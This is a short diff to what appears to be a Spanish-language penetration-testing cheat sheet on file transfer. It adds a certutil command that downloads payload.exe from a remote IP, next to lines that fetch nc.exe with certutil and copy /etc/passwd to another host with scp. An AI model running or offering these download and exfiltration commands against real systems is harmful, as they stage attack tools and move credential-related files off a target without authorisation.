@@ -39,4 +39,5 @@ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/
 ### Certuil Tranferir archivos
 ```python
 certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe (windows)
+certutil -urlcache -f http://10.10.23.2/payload.exe payload.exe (windows)
 ```
